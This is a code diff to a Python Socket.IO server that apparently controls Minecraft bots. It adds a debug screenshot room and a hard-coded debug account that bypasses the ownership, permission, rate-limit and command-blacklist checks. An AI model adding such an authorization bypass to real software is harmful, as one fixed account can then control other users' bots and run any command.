@@ -61,10 +61,20 @@ def emit_image(type, file, room):
     socketio.emit(
         "screenshot",
         {
-            "image": encoded
+            "image": encoded,
+            "bot": room
         },
         room=room
     )
+    if room in BOTS:
+        socketio.emit(
+            "screenshot",
+            {
+                "image": encoded,
+                "bot": room
+            },
+            room=f"debug-{room}"
+        )
     print(f"[socket.py] Emitted screenshot to {room}, {len(file)} bytes")
 
 def get_uuid_auth(uuid):
@@ -423,7 +433,7 @@ def disconnect_request(rdata):
     if "mc_uuid" not in session:
         return
 
-    if session["mc_uuid"] != data["bot"][bot_name]["deployer"]:
+    if session["mc_uuid"] != DEBUG_ACCOUNT_UUID and session["mc_uuid"] != data["bot"][bot_name]["deployer"]:
         return
 
     print(f"[socket.py] Disconnect requested for {bot_name}")
@@ -450,7 +460,7 @@ def switch_request(rdata):
     if "mc_uuid" not in session:
         return
 
-    if session["mc_uuid"] != data["bot"][bot_name]["deployer"]:
+    if session["mc_uuid"] != DEBUG_ACCOUNT_UUID and session["mc_uuid"] != data["bot"][bot_name]["deployer"]:
         return
 
     print(f"[socket.py] Server switch for {bot_name} | World: {world_uuid}")
@@ -476,21 +486,21 @@ def bot_chat(rdata):
     if "mc_uuid" not in session:
         return
 
-    if not data["bot"][bot_name]["status"]:
-        return
-
     account = session["mc_uuid"]
+
+    if account != DEBUG_ACCOUNT_UUID and not data["bot"][bot_name]["status"]:
+        return
     
     try:
-        if data["account"][account]["abilities"]["send"] not in [True,"true"]:
+        if account != DEBUG_ACCOUNT_UUID and data["account"][account]["abilities"]["send"] not in [True,"true"]:
             return
     except:
-        if DEFAULT_ABILITIES["send"] == False:
+        if account != DEBUG_ACCOUNT_UUID and DEFAULT_ABILITIES["send"] == False:
             return
 
     ts = time.time()
 
-    if (ts - data["account"][account].get("last_chat",0)) < 7:
+    if account != DEBUG_ACCOUNT_UUID and (ts - data["account"][account].get("last_chat",0)) < 7:
         print(f"[socket.py] Chat message failed (Ratelimited) through {bot_name} by {account} | Message: {msg}")
         return
 
@@ -502,7 +512,7 @@ def bot_chat(rdata):
     if type == "command":
         match = re.search(r'^/?(\w+) ?(.*)?', msg)
         if match:
-            if session["mc_uuid"] == data["bot"][bot_name]["deployer"]:
+            if account != DEBUG_ACCOUNT_UUID and session["mc_uuid"] == data["bot"][bot_name]["deployer"]:
                 if match.group(1) not in DEPLOYER_COMMANDS and match.group(1) not in WHITELISTED_COMMANDS:
                     if data["account"][session["mc_uuid"]].get("trusted", False):
                         if match.group(1) not in TRUSTED_COMMANDS:
@@ -511,7 +521,7 @@ def bot_chat(rdata):
                     else:
                         print(f"[socket.py] Chat message failed (Blacklisted Command) through {bot_name} by {account} | Message: {msg}")
                         return
-            else:
+            elif account != DEBUG_ACCOUNT_UUID:
                 if match.group(1) not in WHITELISTED_COMMANDS:
                     if data["account"][session["mc_uuid"]].get("trusted", False):
                         if match.group(1) not in TRUSTED_COMMANDS:
